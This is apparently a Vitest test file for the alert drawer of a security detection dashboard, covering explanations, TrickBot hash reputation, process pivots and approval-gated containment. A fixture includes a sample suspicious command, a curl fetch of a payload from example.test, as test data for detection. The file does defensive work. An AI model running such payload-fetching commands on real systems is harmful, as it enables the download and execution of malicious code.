import { render, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import AlertDrawer from '../components/AlertDrawer.jsx';
import { ToastProvider } from '../hooks.jsx';

const jsonOk = (data) => ({
  ok: true,
  status: 200,
  headers: { get: (h) => (h === 'content-type' ? 'application/json' : null) },
  json: async () => data,
  text: async () => JSON.stringify(data),
});

describe('AlertDrawer', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    globalThis.fetch = vi.fn((url) => {
      if (String(url).includes('/api/detection/explain')) {
        return Promise.resolve(
          jsonOk({
            summary: ['Critical alert from agent-1.'],
            why_fired: ['The detector attached credential and lateral movement reasons.'],
            why_safe_or_noisy: ['No prior analyst feedback is recorded for this event.'],
            next_steps: ['Review identity activity and isolate the source if confirmed.'],
            thread_anomalies: [
              {
                kind: 'hot_thread',
                severity: 'high',
                detail: 'Thread CPU peaked at 34.2% during alert collection.',
                evidence: { thread_id: 4242 },
              },
            ],
            entity_scores: [
              {
                entity_kind: 'host',
                entity_id: 'edge-1',
                score: 9.4,
                confidence: 0.93,
                peer_group: 'linux hosts',
                score_components: [
                  { name: 'alert_score', score: 8.4, weight: 0.55 },
                  { name: 'sequence_context', score: 0.7, weight: 0.2 },
                ],
                sequence_signals: [
                  'Credential-access precursor observed in the detection reasons.',
                ],
                graph_context: ['host:edge-1 reported the alert.'],
                recommended_pivots: ['Open host timeline for edge-1.'],
              },
            ],
            evidence_chain: [
              {
                signal_type: 'reason',
                label: 'Detection Reason',
                value: 'credential_dump_attempt user=alice',
                confidence_score: 0.93,
              },
            ],
            matched_rules: [
              {
                rule_id: 'rule-1',
                rule_name: 'Suspicious PowerShell',
                lifecycle_stage: 'canary',
              },
            ],
            similar_past_alerts: [{ event_id: 7, hostname: 'edge-1', severity: 'critical' }],
          }),
        );
      }
      return Promise.resolve(jsonOk({}));
    });
  });

  it('renders server-backed entity risk scoring context', async () => {
    const user = userEvent.setup();

    render(
      <ToastProvider>
        <AlertDrawer
          alert={{
            id: 1,
            alert_id: '1',
            message: 'Credential abuse on edge-1',
            hostname: 'edge-1',
            severity: 'critical',
            score: 8.4,
            confidence: 0.93,
            category: 'credential_access',
            reasons: ['credential_dump_attempt user=alice dst=10.0.0.5 lateral_remote'],
          }}
          onClose={() => {}}
        />
      </ToastProvider>,
    );

    await user.click(screen.getByRole('button', { name: /explain this alert/i }));

    await waitFor(() => {
      expect(screen.getByText('Entity risk scoring')).toBeInTheDocument();
    });
    expect(screen.getByText(/host · edge-1/i)).toBeInTheDocument();
    expect(screen.getByText(/Peer group: linux hosts/i)).toBeInTheDocument();
    expect(screen.getByText(/alert score:/i)).toBeInTheDocument();
    expect(screen.getByText(/Credential-access precursor/i)).toBeInTheDocument();
    expect(screen.getByText('Contributing signals')).toBeInTheDocument();
    expect(screen.getByText(/hot thread/i)).toBeInTheDocument();
    expect(screen.getByText(/Thread CPU peaked at 34.2%/i)).toBeInTheDocument();
    expect(screen.getByText('Evidence chain')).toBeInTheDocument();
    expect(screen.getAllByText(/credential_dump_attempt user=alice/i).length).toBeGreaterThan(0);
    expect(screen.getByText(/Suspicious PowerShell/i)).toBeInTheDocument();
    expect(screen.getByText(/1 similar past alert available for pivot/i)).toBeInTheDocument();
    expect(screen.getByText(/Next pivot: Open host timeline for edge-1/i)).toBeInTheDocument();
  });

  it('renders malware and threat intel context for alert hashes', async () => {
    const knownHash = '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f';

    globalThis.fetch = vi.fn((url, options = {}) => {
      const href = String(url);
      const method = options?.method || 'GET';

      if (href.includes('/api/detection/explain')) {
        return Promise.resolve(
          jsonOk({
            summary: ['Known malware artifact attached to the alert.'],
            why_fired: ['Hash evidence matched the alert context.'],
            next_steps: ['Validate containment and artifact spread.'],
          }),
        );
      }
      if (href.includes('/api/scan/hash') && method === 'POST') {
        return Promise.resolve(
          jsonOk({
            layer: 'hash_db',
            rule_name: 'TrickBot Loader',
            severity: 'high',
            detail: 'TrickBot Loader (TrickBot)',
          }),
        );
      }
      if (href.includes('/api/malware/recent')) {
        return Promise.resolve(
          jsonOk([
            {
              sha256: knownHash,
              name: 'TrickBot Loader',
              family: 'TrickBot',
              severity: 'high',
              detected_at: '2026-04-20T10:03:00Z',
              source: 'feed:otx',
            },
          ]),
        );
      }
      if (href.includes('/api/threat-intel/sightings')) {
        return Promise.resolve(
          jsonOk({
            count: 1,
            items: [
              {
                ioc_type: 'FileHash',
                value: knownHash,
                severity: 'high',
                timestamp: '2026-04-20T10:03:00Z',
                source: 'match',
                context: 'matched FileHash indicator: TrickBot Loader',
                weight: 1.2,
              },
            ],
          }),
        );
      }

      return Promise.resolve(jsonOk({}));
    });

    render(
      <ToastProvider>
        <AlertDrawer
          alert={{
            id: 2,
            alert_id: '2',
            message: `Malware artifact seen ${knownHash}`,
            hostname: 'edge-9',
            severity: 'critical',
            score: 9.4,
            category: 'malware',
            sha256: knownHash,
            reasons: ['hash reputation match'],
          }}
          onClose={() => {}}
        />
      </ToastProvider>,
    );

    expect(await screen.findByText('Malware & Threat Intel')).toBeInTheDocument();
    expect(await screen.findByText('Hash Reputation')).toBeInTheDocument();
    expect(screen.getAllByText('TrickBot Loader').length).toBeGreaterThan(0);
    expect(screen.getByText('TrickBot Loader (TrickBot)')).toBeInTheDocument();
    expect(screen.getByText('Recent Hash Detections')).toBeInTheDocument();
    expect(screen.getByText(/TrickBot · feed:otx/i)).toBeInTheDocument();
    expect(screen.getByText('Recent Threat Intel Sightings')).toBeInTheDocument();
    expect(screen.getByText(/matched FileHash indicator: TrickBot Loader/i)).toBeInTheDocument();
  });

  it('offers an explicit process pivot when the alert carries process fields', async () => {
    const onSelectProcess = vi.fn();

    render(
      <ToastProvider>
        <AlertDrawer
          alert={{
            id: 3,
            alert_id: '3',
            message: 'Suspicious python execution on edge-3',
            hostname: 'edge-3',
            severity: 'severe',
            category: 'malware',
            reasons: ['python dropped a suspicious child process'],
            process: {
              pid: 4242,
              ppid: 321,
              name: '/usr/bin/python3',
              display_name: 'python3',
              user: 'analyst',
              hostname: 'edge-3',
              cmd_line: '/usr/bin/python3 suspicious.py',
              exe_path: '/usr/bin/python3',
            },
          }}
          onClose={() => {}}
          onSelectProcess={onSelectProcess}
        />
      </ToastProvider>,
    );

    expect(await screen.findByText('Process Pivot')).toBeInTheDocument();
    expect(screen.getByText('python3 (PID 4242)')).toBeInTheDocument();

    await userEvent.setup().click(screen.getByRole('button', { name: 'Investigate Process' }));

    expect(onSelectProcess).toHaveBeenCalledWith(
      expect.objectContaining({
        pid: 4242,
        hostname: 'edge-3',
        cmd_line: '/usr/bin/python3 suspicious.py',
      }),
    );
  });

  it('renders backend-resolved process candidates when alert payloads include canonical pivots', async () => {
    const onSelectProcess = vi.fn();

    render(
      <ToastProvider>
        <AlertDrawer
          alert={{
            id: 4,
            alert_id: '4',
            message: 'Suspicious execution chain on edge-4',
            hostname: 'edge-4',
            severity: 'critical',
            category: 'malware',
            process_resolution: 'multiple',
            process_names: ['python3', 'curl'],
            process_candidates: [
              {
                pid: 4242,
                ppid: 321,
                name: '/usr/bin/python3',
                display_name: 'python3',
                user: 'analyst',
                hostname: 'edge-4',
                cmd_line: '/usr/bin/python3 suspicious.py',
              },
              {
                pid: 5252,
                ppid: 4242,
                name: '/usr/bin/curl',
                display_name: 'curl',
                user: 'analyst',
                hostname: 'edge-4',
                cmd_line: '/usr/bin/curl https://example.test/payload',
              },
            ],
            reasons: ['python3 spawned curl with suspicious network activity'],
          }}
          onClose={() => {}}
          onSelectProcess={onSelectProcess}
        />
      </ToastProvider>,
    );

    expect(await screen.findByText('Process Pivot')).toBeInTheDocument();
    expect(screen.getByText('Extracted Process Names')).toBeInTheDocument();
    expect(screen.getAllByText('python3').length).toBeGreaterThan(0);
    expect(screen.getAllByText('curl').length).toBeGreaterThan(0);

    const badge = screen.getByTestId('alert-process-resolution');
    expect(badge).toHaveAttribute('data-resolution', 'multiple');
    expect(badge).toHaveTextContent('2 candidates');

    await userEvent.setup().click(screen.getByRole('button', { name: 'Inspect python3' }));

    expect(onSelectProcess).toHaveBeenCalledWith(
      expect.objectContaining({
        pid: 4242,
        hostname: 'edge-4',
      }),
    );
  });

  it('offers approval-gated containment for authentication surge alerts with source IPs', async () => {
    const user = userEvent.setup();

    globalThis.fetch = vi.fn((url, options = {}) => {
      const href = String(url);
      const method = options?.method || 'GET';

      if (href.includes('/api/detection/explain')) {
        return Promise.resolve(jsonOk({ next_steps: ['Confirm source IP before blocking.'] }));
      }
      if (href.includes('/api/remediation/plan') && method === 'POST') {
        return Promise.resolve(
          jsonOk({
            platform: 'Linux',
            commands: [{ program: 'iptables', args: ['-A', 'INPUT', '-s', '198.51.100.42'] }],
          }),
        );
      }
      if (href.includes('/api/response/request') && method === 'POST') {
        return Promise.resolve(
          jsonOk({
            status: 'submitted',
            request: {
              id: 'resp-1',
              action_label: 'Block IP 198.51.100.42',
              status: 'Pending',
              tier: 'SingleApproval',
              reversal_path: 'Remove block for 198.51.100.42 from network controls.',
            },
          }),
        );
      }

      return Promise.resolve(jsonOk({}));
    });

    render(
      <ToastProvider>
        <AlertDrawer
          alert={{
            id: 5,
            alert_id: '5',
            message: 'Authentication failures surge from 198.51.100.42',
            hostname: 'edge-auth',
            platform: 'linux',
            severity: 'critical',
            category: 'brute_force',
            source_ip: '198.51.100.42',
            reasons: ['auth failures surge'],
          }}
          onClose={() => {}}
        />
      </ToastProvider>,
    );

    expect(await screen.findByText('Containment Actions')).toBeInTheDocument();
    expect(screen.getAllByText('198.51.100.42').length).toBeGreaterThan(0);

    await user.click(screen.getByRole('button', { name: 'Request IP Block' }));

    await waitFor(() => {
      expect(screen.getByText(/Block IP 198.51.100.42/i)).toBeInTheDocument();
    });

    const responseCall = globalThis.fetch.mock.calls.find(([url]) =>
      String(url).includes('/api/response/request'),
    );
    expect(responseCall).toBeTruthy();
    const body = JSON.parse(responseCall[1].body);
    expect(body).toMatchObject({
      action: 'block_ip',
      ip: '198.51.100.42',
      hostname: 'edge-auth',
      dry_run: false,
    });
  });

  it('stages an auth rate-limit dry run when auth alerts lack a source IP', async () => {
    const user = userEvent.setup();

    globalThis.fetch = vi.fn((url, options = {}) => {
      const href = String(url);
      const method = options?.method || 'GET';

      if (href.includes('/api/detection/explain')) {
        return Promise.resolve(jsonOk({ next_steps: ['Review authentication logs.'] }));
      }
      if (href.includes('/api/response/request') && method === 'POST') {
        return Promise.resolve(
          jsonOk({
            status: 'submitted',
            request: {
              id: 'resp-2',
              action_label: 'Throttle to 512 kbps',
              status: 'DryRunCompleted',
              tier: 'Auto',
              reversal_path: 'Restore normal rate limits.',
            },
          }),
        );
      }

      return Promise.resolve(jsonOk({}));
    });

    render(
      <ToastProvider>
        <AlertDrawer
          alert={{
            id: 6,
            alert_id: '6',
            message: 'Authentication failures surge',
            hostname: 'edge-auth',
            severity: 'critical',
            category: 'brute_force',
            reasons: ['auth failures surge'],
          }}
          onClose={() => {}}
        />
      </ToastProvider>,
    );

    expect(await screen.findByText('Containment Actions')).toBeInTheDocument();
    expect(screen.queryByRole('button', { name: 'Request IP Block' })).not.toBeInTheDocument();

    await user.click(screen.getByRole('button', { name: 'Stage Auth Rate Limit' }));

    await waitFor(() => {
      expect(screen.getByText(/Throttle to 512 kbps/i)).toBeInTheDocument();
    });

    const responseCall = globalThis.fetch.mock.calls.find(([url]) =>
      String(url).includes('/api/response/request'),
    );
    expect(responseCall).toBeTruthy();
    const body = JSON.parse(responseCall[1].body);
    expect(body).toMatchObject({
      action: 'throttle',
      rate_limit_kbps: 512,
      hostname: 'edge-auth',
      dry_run: true,
    });
  });

  it('offers artifact and process actions for malware alarms', async () => {
    const user = userEvent.setup();

    globalThis.fetch = vi.fn((url, options = {}) => {
      const href = String(url);
      const method = options?.method || 'GET';

      if (href.includes('/api/detection/explain')) {
        return Promise.resolve(jsonOk({ next_steps: ['Quarantine artifact after validation.'] }));
      }
      if (href.includes('/api/response/request') && method === 'POST') {
        return Promise.resolve(
          jsonOk({
            status: 'submitted',
            request: {
              id: 'resp-3',
              action_label: 'Quarantine file /tmp/dropper.bin',
              status: 'Pending',
              tier: 'SingleApproval',
              reversal_path: 'Release after review.',
            },
          }),
        );
      }

      return Promise.resolve(jsonOk({}));
    });

    render(
      <ToastProvider>
        <AlertDrawer
          alert={{
            id: 7,
            alert_id: '7',
            message: 'Malware execution /tmp/dropper.bin',
            hostname: 'edge-malware',
            severity: 'critical',
            category: 'malware',
            file_path: '/tmp/dropper.bin',
            process: {
              pid: 7331,
              display_name: 'dropper',
              cmd_line: '/tmp/dropper.bin',
            },
            reasons: ['malware hash reputation match'],
          }}
          onClose={() => {}}
        />
      </ToastProvider>,
    );

    expect(await screen.findByText('Containment Actions')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Request File Quarantine' })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Request Process Kill' })).toBeInTheDocument();

    await user.click(screen.getByRole('button', { name: 'Request File Quarantine' }));

    await waitFor(() => {
      expect(screen.getByText(/Quarantine file \/tmp\/dropper.bin/i)).toBeInTheDocument();
    });

    const responseCall = globalThis.fetch.mock.calls.find(([url]) =>
      String(url).includes('/api/response/request'),
    );
    expect(JSON.parse(responseCall[1].body)).toMatchObject({
      action: 'quarantine_file',
      path: '/tmp/dropper.bin',
      hostname: 'edge-malware',
      dry_run: false,
    });
  });
});
